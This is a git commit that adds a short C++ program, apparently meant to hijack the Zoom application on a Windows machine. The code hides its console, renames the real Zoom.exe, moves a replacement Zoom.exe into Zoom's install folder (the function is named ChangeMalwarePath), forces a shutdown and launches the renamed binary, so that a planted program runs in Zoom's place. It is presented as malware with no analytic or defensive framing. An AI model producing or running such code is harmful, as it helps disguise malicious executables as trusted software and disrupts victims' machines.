2703191eadc3b221461dbe1ded658e52a0895de0
TheMentor <80578543+TheMentorHimself@users.noreply.github.com>
2021-03-26 02:30:19 +0000

    Create zimzimzoom.cpp

---
+++ zimzimzoom.cpp
@@ -0,0 +1,39 @@
+//Made by TheMentor//
+
+#include <iostream>
+
+using namespace std;
+
+void HideConsole()
+{
+	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+}
+
+void ExecuteShutDown(){
+	system(R"(shutdown -f)");
+}
+
+void ChangeMalwarePath(){
+	system(R"(move Zoom.exe C:\Users\w0lf\AppData\Roaming\Zoom\bin)");
+	
+	ExecuteShutDown();
+	
+	system(R"(C:\Users\w0lf\AppData\Roaming\Zoom\bin\Zoom2.exe)");
+}
+
+int RenameZoomEXE(){	
+	
+	int val = system(R"(C:\Users\w0lf\AppData\Roaming\Zoom\bin\Zoom2.exe)");
+	if(val == 1){
+		system(R"(rename C:\Users\w0lf\AppData\Roaming\Zoom\bin\Zoom.exe Zoom2.exe)");
+		ChangeMalwarePath();
+	}else{
+		ExecuteShutDown();
+	}
+}
+
+int main(){
+	HideConsole();
+	RenameZoomEXE();
+	//ChangeMalwarePath();
+}
